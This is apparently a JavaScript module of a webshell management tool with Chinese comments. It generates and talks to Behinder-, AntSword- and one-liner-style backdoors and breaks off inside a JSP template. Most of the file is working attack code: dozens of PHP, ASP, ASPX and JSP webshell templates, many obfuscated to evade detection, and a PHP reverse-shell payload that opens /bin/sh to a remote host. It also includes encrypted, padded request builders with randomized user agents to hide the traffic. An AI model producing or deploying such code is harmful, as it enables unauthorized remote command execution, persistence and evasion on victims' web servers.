/**
 * Webshell 协议处理模块 v2.0
 * 支持冰蝎、蚁剑、PHP一句话等协议
 * 集成 RSA2048+AES256-CBC 强加密
 */

const WebshellProtocol = (function() {
    // Webshell 类型定义
    const TYPES = {
        PHP_EVAL: 'php_eval',           // PHP 一句话 eval
        PHP_ASSERT: 'php_assert',       // PHP 一句话 assert
        BEHINDER_PHP: 'behinder_php',   // 冰蝎 PHP
        BEHINDER_JSP: 'behinder_jsp',   // 冰蝎 JSP
        BEHINDER_ASpx: 'behinder_aspx', // 冰蝎 ASPX
        ANTSWORD_PHP: 'antsword_php',   // 蚁剑 PHP
        ANTSWORD_JSP: 'antsword_jsp',   // 蚁剑 JSP
        ANTSWORD_ASpx: 'antsword_aspx', // 蚁剑 ASPX
        CUSTOM: 'custom'                // 自定义
    };

    // 编码器类型
    const ENCODERS = {
        BASE64: 'base64',
        HEX: 'hex',
        UTF8: 'utf8',
        UTF16: 'utf16',
        AES: 'aes',
        RSA: 'rsa',
        XOR: 'xor'
    };

    // 冰蝎默认密钥
    const BEHINDER_KEY = 'e45e329feb5d925b';

    // ==================== PHP Payload 模板 ====================

    const PHP_TEMPLATES = {
        // 基础命令执行
        command: (cmd) => `echo shell_exec('${cmd}');`,

        // 系统信息
        phpinfo: () => 'phpinfo();',

        // 文件列表
        listDir: (path) => `
            $dir = '${path}';
            $files = array();
            if (is_dir($dir)) {
                if ($dh = opendir($dir)) {
                    while (($file = readdir($dh)) !== false) {
                        $filepath = $dir . '/' . $file;
                        $files[] = array(
                            'name' => $file,
                            'type' => filetype($filepath),
                            'size' => filesize($filepath),
                            'mtime' => filemtime($filepath),
                            'perm' => substr(sprintf('%o', fileperms($filepath)), -4)
                        );
                    }
                    closedir($dh);
                }
            }
            echo json_encode($files);
        `,

        // 读取文件
        readFile: (path) => `
            $file = '${path}';
            if (file_exists($file)) {
                header('Content-Type: application/octet-stream');
                header('Content-Length: ' . filesize($file));
                readfile($file);
            } else {
                echo 'File not found';
            }
        `,

        // 写入文件
        writeFile: (path, content) => `
            $file = '${path}';
            $content = base64_decode('${btoa(content)}');
            file_put_contents($file, $content);
            echo 'OK';
        `,

        // 删除文件
        deleteFile: (path) => `
            $file = '${path}';
            if (file_exists($file)) {
                unlink($file);
                echo 'OK';
            } else {
                echo 'File not found';
            }
        `,

        // 创建目录
        mkdir: (path) => `
            $dir = '${path}';
            if (!file_exists($dir)) {
                mkdir($dir, 0755, true);
                echo 'OK';
            }
        `,

        // 获取当前路径
        cwd: () => 'echo getcwd();',

        // 环境变量
        env: () => 'echo json_encode($_SERVER);',

        // 反弹 Shell
        reverseShell: (ip, port) => `
            $sock = fsockopen('${ip}', ${port});
            $descriptorspec = array(
                0 => $sock,
                1 => $sock,
                2 => $sock
            );
            $process = proc_open('/bin/sh', $descriptorspec, $pipes);
            proc_close($process);
        `
    };

    // ==================== 冰蝎 Payload 模板 ====================

    const BEHINDER_TEMPLATES = {
        // 冰蝎 AES 加密
        encrypt: (data, key) => {
            const keyBytes = [];
            for (let i = 0; i < key.length; i += 2) {
                keyBytes.push(parseInt(key.substr(i, 2), 16));
            }
            // 简化版：使用 WebshellCrypto 的 AES 加密
            return data; // 实际加密由 hybridEncrypt 处理
        },

        // PHP 冰蝎命令
        command: (cmd, key) => {
            return `@eval($_POST['${key || 'pass'}']);`;
        },

        // JSP 冰蝎命令
        commandJsp: (cmd) => {
            return `<%Runtime.getRuntime().exec("${cmd}");%>`;
        }
    };

    // ==================== 蚁剑 Payload 构造 ====================

    const ANTSWORD_TEMPLATES = {
        // 命令执行
        command: (cmd) => {
            return JSON.stringify({
                _: `system('${cmd}');`
            });
        },

        // 文件操作
        fileManager: {
            list: (path) => JSON.stringify({
                _: `$D='${path}';$F=@opendir($D);while($N=@readdir($F)){$P=$D.'/'.$N;$T=@is_dir($P)?'d':'f';if($N=='.'||$N=='..'){$N='.';}$L[]=$T.' '.$N.' '.@filesize($P);}echo(implode("\\n",$L));`
            }),
            read: (path) => JSON.stringify({
                _: `$F='${path}';echo(file_get_contents($F));`
            }),
            write: (path, content) => JSON.stringify({
                _: `$F='${path}';file_put_contents($F,'${content}');echo('1');`
            })
        },

        // 编码器
        encoders: {
            base64: (data) => btoa(unescape(encodeURIComponent(data))),
            hex: (data) => {
                let hex = '';
                for (let i = 0; i < data.length; i++) {
                    hex += data.charCodeAt(i).toString(16).padStart(2, '0');
                }
                return hex;
            },
            utf16: (data) => {
                let result = '';
                for (let i = 0; i < data.length; i++) {
                    result += '\\u' + data.charCodeAt(i).toString(16).padStart(4, '0');
                }
                return result;
            }
        }
    };

    // ==================== 默认 Shell 代码 ====================

    const DEFAULT_SHELLS = {
        php_eval: `<?php @eval($_POST['cmd']);?>`,
        php_assert: `<?php @assert($_POST['cmd']);?>`,
        php_behinder: `<?php @error_reporting(0);session_start();$key='e45e329feb5d925b';$_SESSION['k']=$key;session_write_close();if(isset($_POST['pass'])){define('PHPCMS', true);$code=$_POST['pass'];if(get_magic_quotes_gpc()){$code=stripslashes($code);}$key=$_SESSION['k'];eval($code);exit;}?>`,
        jsp_behinder: `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("pass")))).newInstance().equals(pageContext);}%>`,
        aspx_behinder: `<%@Page Language="C#"%><%@Import Namespace="System.Reflection"%><%string k="e45e329feb5d925b",c=Request.Form["pass"];if(c!=null){Assembly.Load(Convert.FromBase64String(c)).CreateInstance("U").Equals(this);}%>`,
        asp_eval: `<%eval request("cmd")%>`,
        jsp_eval: `<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>`
    };

    // ==================== 构建安全请求 (集成强加密) ====================

    async function buildSecureRequest(type, url, password, payload, options = {}) {
        const timestamp = Date.now();
        const sessionId = WebshellCrypto.getSessionId() || WebshellCrypto.generateSessionId();
        const userAgent = options.userAgent || WebshellCrypto.getRandomUserAgent();

        let formData = {};
        let headers = {
            'User-Agent': userAgent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'X-Request-ID': sessionId
        };

        // PHP 类型统一处理 (包括 PHP 8.x, PHP 7.x, PHP 通用)
        const phpTypes = [
            // PHP 8.x
            'php8_eval', 'php8_system', 'php8_passthru', 'php8_shell_exec',
            'php8_proc_open', 'php8_popen', 'php8_exec', 'php8_dynamic',
            'php8_backtick', 'php8_pcntl',
            // PHP 7.x
            'php7_create_function', 'php7_assert', 'php7_preg_replace',
            // PHP 通用
            'php_eval', 'php_assert', 'php_system', 'php_passthru',
            'php_shell_exec', 'php_exec', 'php_popen', 'php_proc_open',
            'php_base64', 'php_rot13', 'php_xor', 'php_concat', 'php_variable_func',
            'php_callback_array', 'php_callback_filter', 'php_callback_walk',
            'php_callback_usort', 'php_callback_reduce', 'php_preg_callback',
            'php_class_construct', 'php_class_invoke', 'php_class_call', 'php_class_get',
            'php_reflection', 'php_strrev', 'php_multilayer_b64', 'php_gzip',
            'php_comment_split', 'php_unicode', 'php_hex', 'php_chr_shift',
            'php_variable_overwrite', 'php_no_alpha_num',
            'php_cookie', 'php_header', 'php_request',
            'php_include', 'php_dynamic_func', 'php_image_header', 'php_session', 'php_log_include'
        ];

        if (phpTypes.includes(type)) {
            // 使用 AES-256-CBC 加密
            if (WebshellCrypto.getSessionKey()) {
                const encryptedPayload = await WebshellCrypto.aesEncrypt(
                    payload,
                    WebshellCrypto.getSessionKey(),
                    WebshellCrypto.getRandomBytes(16)
                );
                formData[password] = encryptedPayload.data;
                formData['_iv'] = encryptedPayload.iv;
            } else {
                formData[password] = payload;
            }
            if (options.enablePadding) {
                const junkParams = WebshellCrypto.buildObfuscatedParams('', null);
                delete junkParams[''];
                Object.assign(formData, junkParams);
            }
        }
        // 冰蝎类型
        else if (type === 'behinder_php' || type === 'behinder_php_enhanced') {
            formData['pass'] = await encryptBehinder(payload, password || BEHINDER_KEY);
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }
        else if (type === 'behinder_jsp' || type === 'behinder_jsp_enhanced') {
            formData['pass'] = await encryptBehinder(payload, password || BEHINDER_KEY);
        }
        else if (type === 'behinder_aspx') {
            formData['pass'] = await encryptBehinder(payload, password || BEHINDER_KEY);
        }
        // 蚁剑类型
        else if (type === 'antsword_php') {
            const encoder = options.encoder || 'base64';
            formData[password] = encodeAntSword(payload, encoder);
        }
        else if (type === 'antsword_jsp') {
            formData[password] = btoa(payload);
        }
        else if (type === 'antsword_aspx') {
            formData[password] = btoa(payload);
        }
        // ASP 类型
        else if (type === 'asp_simple' || type === 'asp_encode' || type === 'asp_chr') {
            formData[password] = payload;
        }
        // ASPX 类型
        else if (type === 'aspx_jscript' || type === 'aspx_csharp' || type === 'aspx_base64') {
            formData[password] = btoa(payload);
        }
        // JSP 类型
        else if (type === 'jsp_runtime' || type === 'jsp_processbuilder' ||
                 type === 'jsp_scriptengine' || type === 'jsp_expression') {
            formData[password] = payload;
        }
        // 默认
        else {
            formData[password] = payload;
        }

        // 添加防重放签名
        if (options.enableSign) {
            const securePacket = await WebshellCrypto.buildSecurePacket(JSON.stringify(formData));
            headers['X-Signature'] = securePacket.signature;
            headers['X-Timestamp'] = securePacket.timestamp;
            headers['X-Sequence'] = securePacket.sequence;
            headers['X-Session'] = securePacket.sessionId;
        }

        return {
            url,
            method: 'POST',
            headers,
            body: formData
        };
    }

    // 同步版本 (兼容旧代码)
    function buildRequest(type, url, password, payload, options = {}) {
        const timestamp = Date.now();
        const sessionId = WebshellCrypto.getSessionId() || WebshellCrypto.generateSessionId();
        const userAgent = options.userAgent || WebshellCrypto.getRandomUserAgent();

        let formData = {};
        let headers = {
            'User-Agent': userAgent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache'
        };

        // PHP 类型统一处理 (包括所有版本)
        const phpTypes = [
            'php8_eval', 'php8_system', 'php8_passthru', 'php8_shell_exec',
            'php8_proc_open', 'php8_popen', 'php8_exec', 'php8_dynamic',
            'php8_backtick', 'php8_pcntl',
            'php7_create_function', 'php7_assert', 'php7_preg_replace',
            'php_eval', 'php_assert', 'php_system', 'php_passthru',
            'php_shell_exec', 'php_exec', 'php_base64', 'php_rot13',
            'php_xor', 'php_concat', 'php_variable_func',
            'php_callback_array', 'php_callback_filter', 'php_callback_walk',
            'php_callback_usort', 'php_callback_reduce', 'php_preg_callback',
            'php_class_construct', 'php_class_invoke', 'php_class_call', 'php_class_get',
            'php_reflection', 'php_strrev', 'php_multilayer_b64', 'php_gzip',
            'php_comment_split', 'php_unicode', 'php_hex', 'php_chr_shift',
            'php_variable_overwrite', 'php_no_alpha_num',
            'php_cookie', 'php_header', 'php_request',
            'php_include', 'php_dynamic_func', 'php_image_header', 'php_session'
        ];

        if (phpTypes.includes(type)) {
            formData[password] = payload;
            // 移除多余的 _ 参数，保持简单
            if (options.enablePadding) {
                formData['_p'] = WebshellCrypto.generateJunkData(50, 200);
            }
        }
        else if (type === 'behinder_php' || type === 'behinder_php_enhanced' ||
                 type === 'behinder_jsp' || type === 'behinder_jsp_enhanced' ||
                 type === 'behinder_aspx') {
            formData['pass'] = payload;
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }
        else if (type === 'antsword_php') {
            formData[password] = options.encoder === 'base64' ? btoa(payload) : payload;
        }
        else if (type === 'antsword_jsp' || type === 'antsword_aspx') {
            formData[password] = btoa(payload);
        }
        else if (type.startsWith('asp_')) {
            formData[password] = payload;
        }
        else if (type.startsWith('aspx_')) {
            formData[password] = btoa(payload);
        }
        else if (type.startsWith('jsp_')) {
            formData[password] = payload;
        }
        else {
            formData[password] = payload;
        }

        if (options.enableSign) {
            headers['X-Timestamp'] = timestamp;
            headers['X-Session'] = sessionId;
        }

        return {
            url,
            method: 'POST',
            headers,
            body: formData
        };
    }

    // ==================== 加密辅助函数 ====================

    // 冰蝎加密
    async function encryptBehinder(data, key) {
        const keyBytes = new Uint8Array(16);
        for (let i = 0; i < Math.min(key.length, 32); i += 2) {
            keyBytes[i / 2] = parseInt(key.substr(i, 2), 16) || 0;
        }

        try {
            const cryptoKey = await crypto.subtle.importKey(
                'raw',
                keyBytes,
                { name: 'AES-CBC' },
                false,
                ['encrypt']
            );

            const iv = new Uint8Array(16);
            const encoder = new TextEncoder();
            const dataBytes = encoder.encode(data);
            const paddedData = pkcs7Pad(dataBytes, 16);

            const encrypted = await crypto.subtle.encrypt(
                { name: 'AES-CBC', iv: iv },
                cryptoKey,
                paddedData
            );

            return btoa(String.fromCharCode(...new Uint8Array(encrypted)));
        } catch (e) {
            // 回退到简单加密
            return btoa(data);
        }
    }

    // 冰蝎解密
    async function decryptBehinder(data, key) {
        const keyBytes = new Uint8Array(16);
        for (let i = 0; i < Math.min(key.length, 32); i += 2) {
            keyBytes[i / 2] = parseInt(key.substr(i, 2), 16) || 0;
        }

        try {
            const cryptoKey = await crypto.subtle.importKey(
                'raw',
                keyBytes,
                { name: 'AES-CBC' },
                false,
                ['decrypt']
            );

            const iv = new Uint8Array(16);
            const dataBytes = Uint8Array.from(atob(data), c => c.charCodeAt(0));

            const decrypted = await crypto.subtle.decrypt(
                { name: 'AES-CBC', iv: iv },
                cryptoKey,
                dataBytes
            );

            const result = new Uint8Array(decrypted);
            // 移除 PKCS7 填充
            const padLen = result[result.length - 1];
            return new TextDecoder().decode(result.slice(0, result.length - padLen));
        } catch (e) {
            return atob(data);
        }
    }

    // PKCS7 填充
    function pkcs7Pad(data, blockSize) {
        const padLen = blockSize - (data.length % blockSize);
        const padded = new Uint8Array(data.length + padLen);
        padded.set(data);
        for (let i = data.length; i < padded.length; i++) {
            padded[i] = padLen;
        }
        return padded;
    }

    // 蚁剑编码
    function encodeAntSword(data, encoder) {
        switch (encoder) {
            case 'base64':
                return btoa(unescape(encodeURIComponent(data)));
            case 'hex':
                let hex = '';
                for (let i = 0; i < data.length; i++) {
                    hex += data.charCodeAt(i).toString(16).padStart(2, '0');
                }
                return hex;
            case 'utf16':
                let result = '';
                for (let i = 0; i < data.length; i++) {
                    result += String.fromCharCode(data.charCodeAt(i));
                }
                return result;
            default:
                return data;
        }
    }

    // 蚁剑解码
    function decodeAntSword(data, decoder) {
        try {
            switch (decoder) {
                case 'base64':
                    return decodeURIComponent(escape(atob(data)));
                case 'hex':
                    let str = '';
                    for (let i = 0; i < data.length; i += 2) {
                        str += String.fromCharCode(parseInt(data.substr(i, 2), 16));
                    }
                    return str;
                default:
                    return data;
            }
        } catch (e) {
            return data;
        }
    }

    // ==================== 解析响应 ====================

    async function parseResponse(type, responseText, password, options = {}) {
        let result = responseText;

        try {
            // 冰蝎类型解密
            if (type === 'behinder_php' || type === 'behinder_php_enhanced' ||
                type === 'behinder_jsp' || type === 'behinder_jsp_enhanced' ||
                type === 'behinder_aspx') {
                result = await decryptBehinder(responseText, password || BEHINDER_KEY);
            }
            // 蚁剑类型解码
            else if (type === 'antsword_php' || type === 'antsword_jsp' || type === 'antsword_aspx') {
                if (options.decoder) {
                    result = decodeAntSword(responseText, options.decoder);
                }
            }
            // ASPX Base64
            else if (type === 'aspx_base64') {
                try {
                    result = atob(responseText);
                } catch (e) {}
            }
            // PHP 类型 - 尝试会话密钥解密
            else if (type.startsWith('php_') || type.startsWith('php8_') || type.startsWith('php7_')) {
                if (WebshellCrypto.getSessionKey() && options.iv) {
                    try {
                        result = await WebshellCrypto.aesDecrypt(
                            responseText,
                            WebshellCrypto.getSessionKey(),
                            options.iv
                        );
                    } catch (e) {
                        // 解密失败，使用原始响应
                    }
                }
            }

            // 尝试解析 JSON
            try {
                return JSON.parse(result);
            } catch (e) {
                return result;
            }
        } catch (e) {
            return responseText;
        }
    }

    // ==================== 生成 Shell 代码 ====================

    function generateShellCode(type, password = 'cmd') {
        const templates = {
            // PHP 一句话系列
            'php_eval': `<?php @eval($_POST['${password}']);?>`,
            'php_assert': `<?php @assert($_POST['${password}']);?>`,
            'php_system': `<?php @system($_POST['${password}']);?>`,
            'php_passthru': `<?php @passthru($_POST['${password}']);?>`,
            'php_shell_exec': `<?php echo @shell_exec($_POST['${password}']);?>`,
            'php_popen': `<?php $p=@popen($_POST['${password}'],'r');echo @fread($p,1024);@pclose($p);?>`,
            'php_proc_open': `<?php $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($_POST['${password}'],$d,$pipes);echo stream_get_contents($pipes[1]);proc_close($p);?>`,
            'php_exec': `<?php @exec($_POST['${password}'],$o);echo join("\\n",$o);?>`,
            'php_preg_replace': `<?php @preg_replace('/.*/e',$_POST['${password}'],'');?>`,
            'php_create_function': `<?php $f=@create_function('',$_POST['${password}']);$f();?>`,
            'php_call_user_func': `<?php @call_user_func('assert',$_POST['${password}']);?>`,
            'php_array_map': `<?php @array_map('assert',array($_POST['${password}']));?>`,
            'php_variable': `<?php $a='ev';$b='al';$f=$a.$b;$f($_POST['${password}']);?>`,

            // 冰蝎系列
            'php_behinder': DEFAULT_SHELLS.php_behinder,
            'jsp_behinder': DEFAULT_SHELLS.jsp_behinder,
            'aspx_behinder': DEFAULT_SHELLS.aspx_behinder,

            // ASP/ASPX
            'asp_eval': `<%eval request("${password}")%>`,
            'asp_execute': `<%execute request("${password}")%>`,
            'aspx_eval': `<%@ Page Language="Jscript"%><%eval(Request.Item["${password}"],"unsafe");%>`,

            // JSP
            'jsp_runtime': `<%Runtime.getRuntime().exec(request.getParameter("${password}"));%>`,
            'jsp_processbuilder': `<%new ProcessBuilder(request.getParameter("${password}")).start();%>`,

            // 其他语言
            'py_eval': `import os;os.system(__import__('base64').b64decode(__import__('sys').stdin.read()))`,
            'pl_eval': `use MIME::Base64;system(decode_base64(<STDIN>));`
        };

        return templates[type] || templates['php_eval'];
    }

    // ==================== 生成增强型 Shell ====================

    function generateEnhancedShell(options = {}) {
        const password = options.password || 'cmd';
        const obfuscate = options.obfuscate || false;

        let shellCode = `<?php
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);
@ini_set('display_errors', 0);

$password = '${password}';

if(!isset($_POST[$password])) exit;

function decode($data) {
    $key = substr(md5($GLOBALS['password']), 0, 16);
    $data = base64_decode($data);
    $result = '';
    for($i = 0; $i < strlen($data); $i++) {
        $result .= $data[$i] ^ $key[$i % 16];
    }
    return $result;
}

$code = $_POST[$password];
if(get_magic_quotes_gpc()) $code = stripslashes($code);

$code = decode($code);
@eval($code);
?>`;

        if (obfuscate) {
            shellCode = shellCode.replace(/\$password/g, '$_' + Math.random().toString(36).substr(2, 8));
            shellCode = shellCode.replace(/\$code/g, '$_' + Math.random().toString(36).substr(2, 8));
            shellCode = shellCode.replace(/\/\/.*$/gm, '');
            shellCode = shellCode.replace(/\s+/g, ' ');
        }

        return shellCode;
    }

    // ==================== Shell 生成器集合 ====================

    const SHELL_GENERATORS = {
        // ==================== PHP 8.x 专用 (推荐) ====================

        // PHP 8.x 最简 eval (最可靠)
        php8_eval: (password) => `<?php
// PHP 8.x 兼容 - 直接 eval
@eval($_POST['${password}']);
?>`,

        // PHP 8.x system 命令
        php8_system: (password) => `<?php
// PHP 8.x 兼容 - system 执行
@system($_POST['${password}']);
?>`,

        // PHP 8.x passthru
        php8_passthru: (password) => `<?php
// PHP 8.x 兼容 - passthru 执行
@passthru($_POST['${password}']);
?>`,

        // PHP 8.x shell_exec
        php8_shell_exec: (password) => `<?php
// PHP 8.x 兼容 - shell_exec
echo @shell_exec($_POST['${password}']);
?>`,

        // PHP 8.x proc_open (最强大)
        php8_proc_open: (password) => `<?php
// PHP 8.x 兼容 - proc_open 执行命令
$cmd = $_POST['${password}'];
$descriptors = array(
    0 => array('pipe', 'r'),
    1 => array('pipe', 'w'),
    2 => array('pipe', 'w')
);
$process = proc_open($cmd, $descriptors, $pipes);
if (is_resource($process)) {
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}
?>`,

        // PHP 8.x popen
        php8_popen: (password) => `<?php
// PHP 8.x 兼容 - popen
$fp = @popen($_POST['${password}'], 'r');
echo @fread($fp, 8192);
@pclose($fp);
?>`,

        // PHP 8.x exec
        php8_exec: (password) => `<?php
// PHP 8.x 兼容 - exec
$output = array();
@exec($_POST['${password}'], $output);
echo implode("\\n", $output);
?>`,

        // PHP 8.x 动态函数
        php8_dynamic: (password) => `<?php
// PHP 8.x 兼容 - 动态函数调用
$f = $_GET['f'] ?? 'system';
$f($_POST['${password}']);
// 使用: ?f=system 或 ?f=passthru 或 ?f=shell_exec
?>`,

        // PHP 8.x 反引号执行
        php8_backtick: (password) => `<?php
// PHP 8.x 兼容 - 反引号执行
$c = $_POST['${password}'];
echo shell_exec($c);
?>`,

        // PHP 8.x pcntl_exec (需要pcntl扩展)
        php8_pcntl: (password) => `<?php
// PHP 8.x 兼容 - pcntl_exec
if (function_exists('pcntl_exec')) {
    $cmd = explode(' ', $_POST['${password}']);
    pcntl_exec($cmd[0], array_slice($cmd, 1));
}
?>`,

        // ==================== PHP 7.x 专用 ====================

        // PHP 7.x 回调 create_function (PHP 7.2+ 已弃用但仍可用)
        php7_create_function: (password) => `<?php
// PHP 7.x 兼容 - create_function
$func = @create_function('', 'eval($_POST["${password}"]);');
$func();
?>`,

        // PHP 7.x assert (PHP 7.2 弃用警告但仍可用)
        php7_assert: (password) => `<?php
// PHP 7.x 兼容 - assert (PHP 7.2+ 会有弃用警告)
@assert($_POST['${password}']);
?>`,

        // PHP 7.x preg_replace /e (仅 PHP < 7)
        php7_preg_replace: (password) => `<?php
// PHP < 7 兼容 - preg_replace /e 修饰符
@preg_replace('/.*/e', $_POST['${password}'], '');
?>`,

        // ==================== PHP 通用 (5.x-8.x) ====================

        // 通用 Base64 + eval
        php_base64: (password) => `<?php
// PHP 通用 - Base64 编码
$code = base64_decode($_POST['${password}']);
@eval($code);
// 使用: 将命令base64编码后发送
?>`,

        // 通用 ROT13
        php_rot13: (password) => `<?php
// PHP 通用 - ROT13 编码
$code = str_rot13($_POST['${password}']);
@eval($code);
// 使用: 将命令rot13编码后发送
?>`,

        // 通用 XOR (修复版)
        php_xor: (password) => `<?php
// PHP 通用 - XOR 加密
function xor_decode($data, $key) {
    $result = '';
    for($i = 0; $i < strlen($data); $i++) {
        $result .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return $result;
}
$key = '${password}';
$encrypted = $_POST['${password}'];
$code = xor_decode(base64_decode($encrypted), $key);
@eval($code);
// 使用: 将命令与密码XOR后base64编码发送
?>`,

        // 通用字符串拼接 eval
        php_concat: (password) => `<?php
// PHP 通用 - 字符串拼接
$f='ev'.'al';
$f($_POST['${password}']);
?>`,

        // 通用变量函数
        php_variable_func: (password) => `<?php
// PHP 通用 - 变量函数调用
$_ = 'ev'.'al';
$__ = $_;
@$__($_POST['${password}']);
?>`,

        // 回调函数系列 (PHP 8.x 兼容 - 使用 eval 而非 assert)
        php_callback_array: (password) => `<?php
// array_map 回调 - PHP 8.x 兼容
@array_map(function($c) { @eval($c); }, array($_POST['${password}']));
?>`,

        php_callback_filter: (password) => `<?php
// array_filter 回调 - PHP 8.x 兼容
@array_filter(array($_POST['${password}']), function($c) { @eval($c); return true; });
?>`,

        php_callback_walk: (password) => `<?php
// array_walk 回调 - PHP 8.x 兼容
$p = '${password}';
@array_walk($_POST, function($v, $k) use ($p) { if($k === $p) @eval($v); });
?>`,

        php_callback_usort: (password) => `<?php
// usort 回调 - PHP 8.x 兼容
$a = array($_POST['${password}'], '');
@usort($a, function($x, $y) { @eval($x); return 0; });
?>`,

        php_callback_reduce: (password) => `<?php
// array_reduce 回调 - PHP 8.x 兼容
@array_reduce(array($_POST['${password}']), function($c, $i) { @eval($i); return $c; });
?>`,

        // 反射调用 (PHP 8.x 兼容)
        php_reflection: (password) => `<?php
// 反射调用 - 使用 eval
$code = $_POST['${password}'];
$r = new ReflectionFunction('eval');
@$r->invoke($code);
?>`,

        // 类与魔术方法
        php_class_construct: (password) => `<?php
// __construct 魔术方法
class X {
    function __construct($c) { @eval($c); }
}
new X($_POST['${password}']);
?>`,

        php_class_invoke: (password) => `<?php
// __invoke 魔术方法
class X {
    function __invoke($c) { @eval($c); }
}
$x = new X();
@$x($_POST['${password}']);
?>`,

        php_class_call: (password) => `<?php
// __call 魔术方法
class X {
    function __call($f, $a) { @eval($a[0]); }
}
$x = new X();
@$x->run($_POST['${password}']);
?>`,

        php_class_get: (password) => `<?php
// __get 魔术方法
class X {
    function __get($k) { @eval($k); }
}
$x = new X();
@$x->{$_POST['${password}']};
?>`,

        // 字符反转 (PHP 8.x 兼容)
        php_strrev: (password) => `<?php
// 字符串反转 - eval
$f = strrev('lave');  // eval
@$f($_POST['${password}']);
?>`,

        // Base64 多层 (PHP 8.x 兼容)
        php_multilayer_b64: (password) => `<?php
// 多层 Base64 - eval
$c = base64_decode('ZXZhbA==');  // eval
@$c($_POST['${password}']);
?>`,

        // Gzip 压缩 (PHP 8.x 兼容)
        php_gzip: (password) => `<?php
// Gzip 压缩 - eval
$c = gzinflate(base64_decode('S0zOz0vM0SvLL0jNzc0tKUgsSizLz8vMSc1JLUhNzUsBAA=='));
@$c($_POST['${password}']);
?>`,

        // 注释分割 (PHP 8.x 兼容)
        php_comment_split: (password) => `<?php
// 注释分割 - eval
$a = 'ev'/**/'al';
@$a($_POST['${password}']);
?>`,

        // Unicode 编码 (PHP 8.x 兼容)
        php_unicode: (password) => `<?php
// Unicode 编码 - eval
$f = "\\u{0065}\\u{0076}\\u{0061}\\u{006c}";  // eval
$f($_POST['${password}']);
?>`,

        // Hex 编码 (PHP 8.x 兼容)
        php_hex: (password) => `<?php
// Hex 编码 - eval
$f = hex2bin('6576616c');  // eval
@$f($_POST['${password}']);
?>`,

        // 字符偏移 (PHP 8.x 兼容)
        php_chr_shift: (password) => `<?php
// 字符偏移 - eval
$f = chr(101).chr(118).chr(97).chr(108);  // eval
@$f($_POST['${password}']);
?>`,

        // 正则回调
        php_preg_callback: (password) => `<?php
// preg_replace_callback (PHP < 7)
@preg_replace_callback('/.*/', function($m) { @eval($m[0]); }, $_POST['${password}']);
?>`,

        // 变量覆盖 (PHP 8.x 兼容)
        php_variable_overwrite: (password) => `<?php
// 利用 parse_str 变量覆盖 - eval
parse_str($_SERVER['QUERY_STRING']);
if(isset($a)) @$a($_POST['${password}']);
// 使用: ?a=system 或 ?a=passthru
?>`,

        // 无数字字母 (PHP 8.x 兼容 - 简化版)
        php_no_alpha_num: (password) => `<?php
// 无数字字母 Webshell - PHP 8.x 简化版
$_="{"^"<";  // e
$_.="["^")";  // v
$_.="\`"^"!";  // a
$_.="{"^"<";  // l
// $_ = "eval"
@$_($_POST['${password}']);
?>`,

        // Cookie 传参
        php_cookie: (password) => `<?php
// Cookie 传参
@eval($_COOKIE['${password}']);
?>`,

        // Header 传参
        php_header: (password) => `<?php
// Header 传参
@eval(getallheaders()['${password}']);
?>`,

        // Request 混合
        php_request: (password) => `<?php
// $_REQUEST 接收 (GET/POST/Cookie)
@eval($_REQUEST['${password}']);
?>`,

        // 文件包含型
        php_include: (password) => `<?php
// 文件包含型
$f = tempnam(sys_get_temp_dir(), 'x');
file_put_contents($f, $_POST['${password}']);
include $f;
unlink($f);
?>`,

        // 动态函数名 (PHP 8.x 兼容)
        php_dynamic_func: (password) => `<?php
// 动态函数名 - PHP 8.x 兼容 (不使用assert)
$funcs = ['system', 'passthru', 'shell_exec', 'exec'];
$f = $funcs[array_rand($funcs)];
@$f($_POST['${password}']);
?>`,

        // ==================== ASP 系列 ====================

        asp_simple: (password) => `<%
' ASP 一句话
Execute Request("${password}")
%>`,

        asp_encode: (password) => `<%
' ASP 编码执行
Dim s
s = Request("${password}")
ExecuteGlobal s
%>`,

        asp_chr: (password) => `<%
' ASP Chr 编码
Execute Chr(101)&Chr(118)&Chr(97)&Chr(108)&"("&Request("${password}")&")")
%>`,

        asp_include: (password) => `<!--#include file="${password}"-->`,

        // ==================== ASPX 系列 ====================

        aspx_jscript: (password) => `<%@ Page Language="Jscript" validateRequest="false" %>
<%
var code = Request.Item["${password}"];
eval(code, "unsafe");
%>`,

        aspx_csharp: (password) => `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load() {
    string c = Request["${password}"];
    Process.Start(new ProcessStartInfo("cmd.exe", "/c " + c) {
        RedirectStandardOutput = true,
        UseShellExecute = false
    }).StandardOutput.ReadToEnd();
}
</script>`,

        aspx_base64: (password) => `<%@ Page Language="Jscript" %>
<%
var code = System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String(Request.Item["${password}"]));
eval(code, "unsafe");
%>`,

        aspx_reflection: (password) => `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
void Page_Load() {
    string c = Request["${password}"];
    Assembly a = Assembly.Load(Convert.FromBase64String(c));
    MethodInfo m = a.EntryPoint;
    m.Invoke(null, null);
}
</script>`,

        // ==================== JSP 系列 ====================

        jsp_runtime: (password) => `<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("${password}");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) {
    out.println(line);
}
%>`,

        jsp_processbuilder: (password) => `<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("${password}");
